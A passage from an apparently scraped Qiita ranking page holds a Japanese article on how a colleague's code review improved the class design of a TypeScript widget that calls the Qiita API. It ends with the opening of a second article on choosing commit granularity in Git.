		<a target="_blank" href="https://qiita.com/y_hokkey/items/055e335b9d6d6f77c7ad">同僚のコードレビューでこんなにクラスの設計が良くなったという話</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-10<br />14:25:04</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/48238.html">y_hokkey</a>(59件の記事)<br />(LIG INC. 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/48238/profile-images/1511487513">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> <b>[TypeScript]</b> <b>[QiitaAPI]</b> <b>[コードレビュー]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>弊社では、案件とは関係のないプロジェクトでも業務時間中にみんなにコードレビューを依頼できる時間が確保されています(参加は任意)。案件のコードレビューを依頼したり、ちょっとした個人の制作物を見てらったりと使い方は色々です。</p>

<p>先日、TypeScriptの練習に<a href="https://media-massage.net/qiita-widget-js/" rel="nofollow noopener" target="_blank">QiitaのAPIを叩いていて記事を表示するブログウィジェット</a>を作成しました。このウィジェットのレビューを依頼したところ、クラスの設計について具体的な指摘と、それに対する改善を経験できたのでこの記事に記載します。</p>

<h2>
<span id="今回作ったqiitawidgetの要件" class="fragment"></span><a href="#%E4%BB%8A%E5%9B%9E%E4%BD%9C%E3%81%A3%E3%81%9Fqiitawidget%E3%81%AE%E8%A6%81%E4%BB%B6"><i class="fa fa-link"></i></a>今回作ったQiitaWidgetの要件</h2>

<ul>
<li>Qiitaの公式APIV2から記事とユーザー情報を取得し、HTMLテンプレートに表示する</li>
<li>投稿の合計いいね数を算出するために、あるユーザーの投稿を全件取得する

<ul>
<li>(このために複数回リクエストの送信とレスポンスデータの結合を行う)</li>
</ul>
</li>
<li>パラメータによってユーザー、いいね数によるソート、表示件数、ランダム表示の有無などをカスタマイズできる</li>
<li>ajaxライブラリに<a href="https://www.npmjs.com/package/axios" rel="nofollow noopener" target="_blank">axios</a>を使う／jQueryを使わない</li>
<li>APIの制限を回避するために、レスポンスデータをブラウザにキャッシュする機能がある</li>
<li>TypeScriptで実装する

<ul>
<li> any型の使用は最小限にする</li>
</ul>
</li>
</ul>

<h2>
<span id="レビュー時点での設計" class="fragment"></span><a href="#%E3%83%AC%E3%83%93%E3%83%A5%E3%83%BC%E6%99%82%E7%82%B9%E3%81%A7%E3%81%AE%E8%A8%AD%E8%A8%88"><i class="fa fa-link"></i></a>レビュー時点での設計</h2>

<p>レビュー時点でのクラスの設計をゆるく図にまとめました。</p>

<p><a href="https://camo.qiitausercontent.com/18582737364d2f17d87bd645487dfa63c6e53259/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34383233382f32383564353364322d623239312d663339302d646630632d6364663836366332323230632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/18582737364d2f17d87bd645487dfa63c6e53259/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34383233382f32383564353364322d623239312d663339302d646630632d6364663836366332323230632e706e67" alt="スクリーンショット 2017-10-10 0.22.12.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/48238/285d53d2-b291-f390-df0c-cdf866c2220c.png"></a></p>

<p>おおまかな処理の流れは</p>

<ol>
<li>
<code>QiitaWidget</code>が<code>CachedApiConfCreator</code>でGETのためのパラメータを作成</li>
<li>
<code>CachedApi</code>から<code>CachedResponse</code>の型でレスポンスを受け取る</li>
<li>
<code>QiitaPresenter</code>へレスポンスを渡して描画してもらう</li>
</ol>

<p>……というものです。実装の詳細はGitHubの過去履歴を参照してください。</p>

<ul>
<li><a href="https://github.com/hokkey/qiita-widget-js/tree/0.0.3/src/lib" rel="nofollow noopener" target="_blank">qiita-widget-js/src/lib at 0.0.3 · hokkey/qiita-widget-js</a></li>
</ul>

<h2>
<span id="レビューによる指摘" class="fragment"></span><a href="#%E3%83%AC%E3%83%93%E3%83%A5%E3%83%BC%E3%81%AB%E3%82%88%E3%82%8B%E6%8C%87%E6%91%98"><i class="fa fa-link"></i></a>レビューによる指摘</h2>

<p><a href="https://camo.qiitausercontent.com/0c86915b6c47e4a0e6f7bb0dafd9f615d31c26a8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34383233382f35356432353738642d613936382d303962392d656163342d6235333137396661396536632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/0c86915b6c47e4a0e6f7bb0dafd9f615d31c26a8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34383233382f35356432353738642d613936382d303962392d656163342d6235333137396661396536632e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/48238/55d2578d-a968-09b9-eac4-b53179fa9e6c.png"></a></p>

<ul>
<li>防御的な引数の型チェックが多いが、TypeScriptならもっと引数を信頼していい</li>
<li>QiitaPresenterはビューの表示に特化し、データの整形などを行うべきではない</li>
<li>キャッシュ機能を自前で実装しているが、既存のライブラリがあるのでそれを使った方がよい

<ul>
<li>さらに、CachedApiという名前から職務が想像しにくい</li>
</ul>
</li>
<li>QiitaWidget内にAPI絡みの詳細な実装を入れない方が良い</li>
</ul>

<h3>
<span id="防御的な引数の型チェックが多いがtypescriptならもっと引数を信頼していい" class="fragment"></span><a href="#%E9%98%B2%E5%BE%A1%E7%9A%84%E3%81%AA%E5%BC%95%E6%95%B0%E3%81%AE%E5%9E%8B%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF%E3%81%8C%E5%A4%9A%E3%81%84%E3%81%8Ctypescript%E3%81%AA%E3%82%89%E3%82%82%E3%81%A3%E3%81%A8%E5%BC%95%E6%95%B0%E3%82%92%E4%BF%A1%E9%A0%BC%E3%81%97%E3%81%A6%E3%81%84%E3%81%84"><i class="fa fa-link"></i></a>防御的な引数の型チェックが多いが、TypeScriptならもっと引数を信頼していい</h3>

<p>普段JavaScriptで実装する際、パラメータに想定外のデータ型が入るのが嫌で型チェックをかける癖がありました。</p>

<div class="code-frame" data-lang="typescript">
<div class="code-lang"><span class="bold">CachedApiConfCreator.ts</span></div>
<div class="highlight"><pre><span></span><span class="kr">static</span> <span class="nx">validateConf</span><span class="p">(</span><span class="nx">conf</span>: <span class="kt">CachedApiConf</span><span class="p">)</span><span class="o">:</span> <span class="k">void</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isType</span><span class="p">(</span><span class="nx">conf</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="s1">'string'</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="nx">TypeError</span><span class="p">(</span><span class="s1">'id must be a string!'</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isType</span><span class="p">(</span><span class="nx">conf</span><span class="p">.</span><span class="nx">endpoint</span><span class="p">,</span> <span class="s1">'string'</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="nx">TypeError</span><span class="p">(</span><span class="s1">'endpoint must be a string!'</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isType</span><span class="p">(</span><span class="nx">conf</span><span class="p">.</span><span class="nx">axiosRequestConfig</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">,</span> <span class="s1">'number'</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="nx">TypeError</span><span class="p">(</span><span class="s1">'page param is not available!'</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isType</span><span class="p">(</span><span class="nx">conf</span><span class="p">.</span><span class="nx">axiosRequestConfig</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">per_page</span><span class="p">,</span> <span class="s1">'number'</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="nx">TypeError</span><span class="p">(</span><span class="s1">'per_page param is not available!'</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<ul>
<li><a href="https://github.com/hokkey/qiita-widget-js/blob/0.0.3/src/lib/CachedApiConfCreator.ts" rel="nofollow noopener" target="_blank">qiita-widget-js/CachedApiConfCreator.ts at 0.0.3 · hokkey/qiita-widget-js</a></li>
</ul>

<p>しかし、TypeScriptであれば引数の型はインタフェースで保証できるため、コンパイルが通っているのであれば余計な型チェックは不要でした。ブラウザ実行時に想定と異なる型で値が渡る可能性のあるところにだけ型チェックがあれば良いと思います。</p>

<h3>
<span id="qiitapresenterはビューの表示に特化しデータの整形を行うべきではない" class="fragment"></span><a href="#qiitapresenter%E3%81%AF%E3%83%93%E3%83%A5%E3%83%BC%E3%81%AE%E8%A1%A8%E7%A4%BA%E3%81%AB%E7%89%B9%E5%8C%96%E3%81%97%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E6%95%B4%E5%BD%A2%E3%82%92%E8%A1%8C%E3%81%86%E3%81%B9%E3%81%8D%E3%81%A7%E3%81%AF%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>QiitaPresenterはビューの表示に特化し、データの整形を行うべきではない</h3>

<p>QiitaPresenterは、受け取ったレスポンンスデータをビューに展開する責務を負ったクラスとして設計しました。「表示のための整形であればQiitaPresenter内で処理するべきかな?」という気持ちでQiitaPresenter内へ記事配列のソートやシャッフルといった機能を実装してありました。</p>

<div class="code-frame" data-lang="typescript">
<div class="code-lang"><span class="bold">QiitaPresenter.ts</span></div>
<div class="highlight"><pre><span></span><span class="kr">private</span> <span class="nx">createTargetArticleList</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">source</span>: <span class="kt">T</span><span class="p">[],</span> <span class="nx">orders</span>: <span class="kt">number</span><span class="p">[])</span><span class="o">:</span> <span class="nx">T</span><span class="p">[]</span> <span class="p">{</span>
  <span class="c1">// Sort the list if not it using shuffle</span>
  <span class="kd">let</span> <span class="nx">articles</span> <span class="o">=</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">conf</span><span class="p">.</span><span class="nx">sortByLike</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">conf</span><span class="p">.</span><span class="nx">useShuffle</span><span class="p">)</span>
    <span class="o">?</span> <span class="nx">Util</span><span class="p">.</span><span class="nx">sortArray</span><span class="p">(</span><span class="nx">source</span><span class="p">,</span> <span class="s1">'likes_count'</span><span class="p">)</span>
    <span class="o">:</span> <span class="nx">source</span>
  <span class="p">;</span>

  <span class="c1">// Create a list of required articles</span>
  <span class="nx">articles</span> <span class="o">=</span> <span class="nx">orders</span><span class="p">.</span><span class="nx">map</span><span class="p">((</span><span class="nx">val</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">source</span><span class="p">[</span><span class="nx">val</span><span class="p">];</span>
  <span class="p">});</span>

  <span class="c1">// Sort the list if it using shuffle</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">conf</span><span class="p">.</span><span class="nx">sortByLike</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">conf</span><span class="p">.</span><span class="nx">useShuffle</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">Util</span><span class="p">.</span><span class="nx">sortArray</span><span class="p">(</span><span class="nx">articles</span><span class="p">,</span> <span class="s1">'likes_count'</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="nx">articles</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<ul>
<li><a href="https://github.com/hokkey/qiita-widget-js/blob/0.0.3/src/lib/QiitaPresenter.ts" rel="nofollow noopener" target="_blank">qiita-widget-js/QiitaPresenter.ts at 0.0.3 · hokkey/qiita-widget-js</a></li>
</ul>

<p>しかし、QiitaPresenterはビューの表示に特化するべきで、データ自体を加工するのは外部で行うべきという指摘を受けました。なるべく<strong>クラス1つあたりの責務を小さく設定する</strong>のがベターということでした。</p>

<h3>
<span id="キャッシュ機能を自前で実装しているが既存のライブラリがあるのでそれを使った方がよい" class="fragment"></span><a href="#%E3%82%AD%E3%83%A3%E3%83%83%E3%82%B7%E3%83%A5%E6%A9%9F%E8%83%BD%E3%82%92%E8%87%AA%E5%89%8D%E3%81%A7%E5%AE%9F%E8%A3%85%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B%E3%81%8C%E6%97%A2%E5%AD%98%E3%81%AE%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E3%81%8C%E3%81%82%E3%82%8B%E3%81%AE%E3%81%A7%E3%81%9D%E3%82%8C%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%9F%E6%96%B9%E3%81%8C%E3%82%88%E3%81%84"><i class="fa fa-link"></i></a>キャッシュ機能を自前で実装しているが、既存のライブラリがあるのでそれを使った方がよい</h3>

<p>axiosそれ自体にはキャッシュ機能がありません。そのため、レスポンスデータを日付付きでlocalStorageへ保存したり読み込んだりするCachedResponseというクラスを作っていました。</p>

<ul>
<li><a href="https://github.com/hokkey/qiita-widget-js/blob/0.0.3/src/lib/CachedResponse.ts" rel="nofollow noopener" target="_blank">qiita-widget-js/CachedResponse.ts at 0.0.3 · hokkey/qiita-widget-js</a></li>
</ul>

<p>しかし、レビュアーからは「ググったら既存のライブラリがあったからそれ使ったら?」という指摘が……。たしかに、axios自体にキャッシュ機能はありませんでしたが、axiosのAdapterとしてaxios-cache-adapterというライブラリが公開されていました。</p>

<ul>
<li><a href="https://www.npmjs.com/package/axios-cache-adapter" rel="nofollow noopener" target="_blank">axios-cache-adapter</a></li>
</ul>

<p>どう考えても自分の雑な実装よりも信頼性に優れていて実装も隠蔽できるため、そちらを採用するように変更しました。</p>

<p>教訓としては<strong>一般的な機能は既存のライブラリがないかまず探してみる</strong>ということに尽きると思います。</p>

<h3>
<span id="qiitawidget内にapi絡みの詳細な実装を入れない方が良い" class="fragment"></span><a href="#qiitawidget%E5%86%85%E3%81%ABapi%E7%B5%A1%E3%81%BF%E3%81%AE%E8%A9%B3%E7%B4%B0%E3%81%AA%E5%AE%9F%E8%A3%85%E3%82%92%E5%85%A5%E3%82%8C%E3%81%AA%E3%81%84%E6%96%B9%E3%81%8C%E8%89%AF%E3%81%84"><i class="fa fa-link"></i></a>QiitaWidget内にAPI絡みの詳細な実装を入れない方が良い</h3>

<p>CachedApiクラスは汎用を意図していたため、次ページのリクエストや、複数ページのレスポンスの結合といった処理はQiitaWidgetクラス内で行っていました。</p>

<div class="code-frame" data-lang="typescript">
<div class="code-lang"><span class="bold">QiitaWidget.ts</span></div>
<div class="highlight"><pre><span></span><span class="c1">// 記事がなくなるか、最大試行回数に到達するまでリクエストを続ける</span>
<span class="kr">private</span> <span class="nx">async</span> <span class="nx">fetchList</span><span class="p">()</span><span class="o">:</span> <span class="nx">Promise</span><span class="o">&lt;</span><span class="k">void</span><span class="o">&gt;</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="nx">counter</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">.</span><span class="nx">conf</span><span class="p">.</span><span class="nx">maxRequest</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">fetchOnce</span><span class="p">())</span> <span class="p">{</span>
      <span class="nx">counter</span><span class="o">++</span><span class="p">;</span>
      <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">break</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="kr">private</span> <span class="nx">async</span> <span class="nx">fetchOnce</span><span class="p">()</span><span class="o">:</span> <span class="nx">Promise</span><span class="o">&lt;</span><span class="kr">boolean</span><span class="o">&gt;</span> <span class="p">{</span>
  <span class="kr">const</span> <span class="nx">res</span>: <span class="kt">CachedResponse</span><span class="o">&lt;</span><span class="nx">QiitaResponse</span><span class="p">.</span><span class="nx">Article</span><span class="p">[]</span><span class="o">&gt;</span> <span class="o">=</span>
    <span class="nx">await</span> <span class="nx">CachedApi</span><span class="p">.</span><span class="nx">get</span><span class="o">&lt;</span><span class="nx">QiitaResponse</span><span class="p">.</span><span class="nx">Article</span><span class="p">[]</span><span class="o">&gt;</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">apiConfCreator</span><span class="p">.</span><span class="nx">getNextConf</span><span class="p">());</span>

  <span class="c1">// 記事数0：ループ終了</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// 記事数がperPage未満：結果を追加してループ終了</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">.</span><span class="nx">conf</span><span class="p">.</span><span class="nx">perPage</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">dataList</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">dataList</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nx">res</span><span class="p">);</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// 記事数がperPageと同値以上：結果を追加してループ継続</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">dataList</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">dataList</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nx">res</span><span class="p">);</span>
  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<ul>
<li><a href="https://github.com/hokkey/qiita-widget-js/blob/0.0.3/src/lib/QiitaWidget.ts" rel="nofollow noopener" target="_blank">qiita-widget-js/QiitaWidget.ts at 0.0.3 · hokkey/qiita-widget-js</a></li>
</ul>

<p>レビュアーからは「APIとの通信 + 全件取る処理を他へ分けた方が良い」、「fetchOnceが副作用とbooleanの戻り値の両方の仕事を持っているのが良くない」「fetchOnceという名前も微妙」という指摘を受けました。</p>

<blockquote>
<p>APIとの通信 + 全件取る処理を他へ分けた方が良い</p>
</blockquote>

<p>これが問題としては一番大きく、QiitaWidgetはマネージャー的な役割に徹し、詳細な実装はQiitaWidgetの外側に出した方が良いということでした。</p>

<blockquote>
<p>fetchOnceが副作用とbooleanの戻り値の両方の仕事を持っているのが良くない<br>
fetchOnceという名前も微妙</p>
</blockquote>

<p>もっともですが実装中には気付けませんでした。こういった客観的な指摘が得られるのがコードレビューの良いところだと思います。</p>

<h2>
<span id="改善結果" class="fragment"></span><a href="#%E6%94%B9%E5%96%84%E7%B5%90%E6%9E%9C"><i class="fa fa-link"></i></a>改善結果</h2>

<h3>
<span id="型チェックの除去" class="fragment"></span><a href="#%E5%9E%8B%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF%E3%81%AE%E9%99%A4%E5%8E%BB"><i class="fa fa-link"></i></a>型チェックの除去</h3>

<blockquote>
<p>防御的な引数の型チェックが多いが、TypeScriptならもっと引数を信頼していい</p>
</blockquote>

<p>引数の型はインタフェースで定義されているため、型チェックを外しました。ただし、数値の最大値・最小値といった内容の検証は残している箇所があります。</p>

<h3>
<span id="axios-cache-adapterの導入" class="fragment"></span><a href="#axios-cache-adapter%E3%81%AE%E5%B0%8E%E5%85%A5"><i class="fa fa-link"></i></a>axios-cache-adapterの導入</h3>

<blockquote>
<p>キャッシュ機能を自前で実装しているが、既存のライブラリがあるのでそれを使った方がよい</p>
</blockquote>

<p>キャッシュ機能を外部ライブラリで賄えるようになったため、CachedApi、CachedResponseといったクラスは廃止しました。これにより<strong>コード内でキャッシュを気にすることが完全に不要</strong>となりました。</p>

<h3>
<span id="qiitawidgetとqiitapresenterの機能を新クラスへ分離" class="fragment"></span><a href="#qiitawidget%E3%81%A8qiitapresenter%E3%81%AE%E6%A9%9F%E8%83%BD%E3%82%92%E6%96%B0%E3%82%AF%E3%83%A9%E3%82%B9%E3%81%B8%E5%88%86%E9%9B%A2"><i class="fa fa-link"></i></a>QiitaWidgetとQiitaPresenterの機能を新クラスへ分離</h3>

<blockquote>
<p>QiitaPresenterはビューの表示に特化し、データの整形を行うべきではない</p>
</blockquote>

<p>旧QiitaWidgetの処理の一部と、旧QiitaPresenterの行っていたデータ操作的な処理を新たにQiitaItemsとしてまとめなおしました。QiitaItemsの責務はレスポンスデータのリクエスト／格納と、QiitaPresenter用のデータの整形／出力です。</p>

<ul>
<li><a href="https://github.com/hokkey/qiita-widget-js/blob/0.3.2/lib/QiitaItems.ts" rel="nofollow noopener" target="_blank">qiita-widget-js/QiitaItems.ts at 0.3.2 · hokkey/qiita-widget-js</a></li>
</ul>

<p>これにより、QiitaPresenterはデータの表示に特化し、QiitaWidgetは直接レスポンスデータを操作する必要がなくなりました。</p>

<blockquote>
<p>QiitaWidget内にAPI絡みの詳細な実装を入れない方が良い</p>
</blockquote>

<p>旧QiitaWidgetと旧CachedApiParamCreatorの機能を統合したQiitaItemsApiを新たに作成しました。責務はデータの取得と、GETパラメータの管理機能です。</p>

<ul>
<li><a href="https://github.com/hokkey/qiita-widget-js/blob/0.3.2/lib/QiitaItemsApi.ts" rel="nofollow noopener" target="_blank">qiita-widget-js/QiitaItemsApi.ts at 0.3.2 · hokkey/qiita-widget-js</a></li>
</ul>

<p>前項の変更と併せ、QiitaWidgetの責務が非常にシンプルになりました。</p>

<ul>
<li><a href="https://github.com/hokkey/qiita-widget-js/blob/0.3.2/lib/QiitaWidget.ts" rel="nofollow noopener" target="_blank">qiita-widget-js/QiitaWidget.ts at 0.3.2 · hokkey/qiita-widget-js</a></li>
</ul>

<blockquote>
<p>fetchOnceが副作用とbooleanの戻り値の両方の仕事を持っているのが良くない</p>
</blockquote>

<p>こちらは、booleanを返す機能と、レスポンスをプロパティに追加する機能にきっちり分けました。</p>

<h2>
<span id="改善後の設計" class="fragment"></span><a href="#%E6%94%B9%E5%96%84%E5%BE%8C%E3%81%AE%E8%A8%AD%E8%A8%88"><i class="fa fa-link"></i></a>改善後の設計</h2>

<p>全体的にクラスの責務がより細分化され、役割がはっきりした設計となりました。</p>

<p><a href="https://camo.qiitausercontent.com/60fab1f58f1d0cdf9e605eff3b2ea865c378a30b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34383233382f66356262643432392d646661352d613963662d373139302d3963623739643866363033302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/60fab1f58f1d0cdf9e605eff3b2ea865c378a30b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34383233382f66356262643432392d646661352d613963662d373139302d3963623739643866363033302e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/48238/f5bbd429-dfa5-a9cf-7190-9cb79d8f6030.png"></a></p>

<ul>
<li><a href="https://github.com/hokkey/qiita-widget-js/tree/0.3.2/lib" rel="nofollow noopener" target="_blank">qiita-widget-js/lib at 0.3.2 · hokkey/qiita-widget-js</a></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">54位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>186</kbd>
		<a target="_blank" href="https://qiita.com/jnchito/items/40e0c7d32fde352607be">【初心者向け】「コミットの粒度がわからない問題」の模範解答を考えてみた</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-25<br />10:09:08</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/7465.html">jnchito</a>(165件の記事)<br />(SonicGarden Inc. 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/7465/profile-images/1500323590">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Rails]</b> <b>[Git]</b> <b>[GitHub]</b> <b>[新人プログラマ応援]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h2>

<p>先日参加した<a href="https://rails-developers-meetup.connpass.com/event/60765/" rel="nofollow noopener" target="_blank">Rails Developers Meetup</a>の中で、「コミットの粒度がわからない問題」が少し話題になっていました。</p>

<blockquote class="twitter-tweet">
<p>「commitの粒度がわからない」すいません、私もです…！よく迷っちゃいます…！！！ <a href="https://twitter.com/hashtag/railsdm?src=hash" rel="nofollow noopener" target="_blank">#railsdm</a></p>— まえとー (@maetoo11) <a href="https://twitter.com/maetoo11/status/888014333334003712" rel="nofollow noopener" target="_blank">July 20, 2017</a>
</blockquote>



<blockquote class="twitter-tweet">
<p>commitの粒度がわからない問題、ある。（ほんとわからない）  <a href="https://twitter.com/hashtag/railsdm?src=hash" rel="nofollow noopener" target="_blank">#railsdm</a></p>— おおた (@ota42y) <a href="https://twitter.com/ota42y/status/888014298131202049" rel="nofollow noopener" target="_blank">July 20, 2017</a>
</blockquote>



<p>普段僕は感覚的に「それっ、ここでコミット！」とコミットしているんですが、具体的にどういうルールでやってるの？と聞かれると、きれいに明文化しづらいものです。</p>

<p>とはいえ、できるだけ明文化できるよう、模範解答を考えてみました。<br>
この記事ではそんな「適切なコミット粒度」について解説します。</p>

<h3>
<span id="動画で明文化" class="fragment"></span><a href="#%E5%8B%95%E7%94%BB%E3%81%A7%E6%98%8E%E6%96%87%E5%8C%96"><i class="fa fa-link"></i></a>動画で明文化・・・！？</h3>

<p>すいません、「明文化した模範解答」というのは半分ウソです <img alt=":droplet:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/1f4a7.png" title=":droplet:" width="20"> </p>

<p>なかなかパシッ！とルールを明文化できないので、いったん動画の中でつらつらと「コミットの粒度」について語ってみることにしました。</p>

<p>それがこちらの動画です。</p>

<p><a href="https://www.youtube.com/watch?v=kwdsOz9YF8k&amp;feature=youtu.be" rel="nofollow noopener" target="_blank">【初心者向け】「コミットの粒度がわからない問題」の模範解答を考えてみた - YouTube<img src="https://camo.qiitausercontent.com/18558c66e533214ba4ee789e8353f10ae609c343/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373436352f62386163613961612d333839392d303961632d663566612d6463326238363565613935342e706e67" alt="Screen Shot 2017-09-25 at 10.10.46.png" title="Screen Shot 2017-09-25 at 10.10.46.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/7465/b8aca9aa-3899-09ac-f5fa-dc2b865ea954.png"></a></p>

<p>そしてこの記事では動画の内容をざっくりとピックアップしてみました。</p>

<p>というわけで、動画が本編でこちらの記事はオマケになるので、できるだけ動画の方から先に視聴するようにしてください。</p>

<p>ちなみに動画の長さは35分程度です。<br>
さくっと視聴するために1.5倍速ぐらいで視聴することをオススメします。</p>

<h3>
<span id="議論の前提" class="fragment"></span><a href="#%E8%AD%B0%E8%AB%96%E3%81%AE%E5%89%8D%E6%8F%90"><i class="fa fa-link"></i></a>議論の前提</h3>

<p>「コミットの粒度」という話題は言語やフレームワークを問わずに議論できるはずですが、念のため僕が普段開発している環境をお知らせしておきます。</p>

<ul>
<li>使用する変更管理ツール＝gitとGitHub</li>
<li>使用する言語とフレームワーク＝RubyとRuby on Rails</li>
<li>対象アプリケーション＝仕事で開発するRailsアプリケーション</li>
</ul>

<p>上記の環境に近い人ほど、以下の議論が伝わりやすいかもしれません。</p>

<p>それでは以下が議論の本編（動画の大まかな内容）です。</p>

<h2>
<span id="sonicgardenのメンバーに聞いてみた0200" class="fragment"></span><a href="#sonicgarden%E3%81%AE%E3%83%A1%E3%83%B3%E3%83%90%E3%83%BC%E3%81%AB%E8%81%9E%E3%81%84%E3%81%A6%E3%81%BF%E3%81%9F0200"><i class="fa fa-link"></i></a>SonicGardenのメンバーに聞いてみた（02:00～）</h2>

<p>僕一人の意見に偏るといけないので、僕が勤めている<a href="http://www.sonicgarden.jp/" rel="nofollow noopener" target="_blank">ソニックガーデン</a>のメンバー（全員Railsプログラマ）に「適切なコミット粒度」について質問してみました。</p>

<p>以下はメンバーから出た意見です。</p>

<h3>
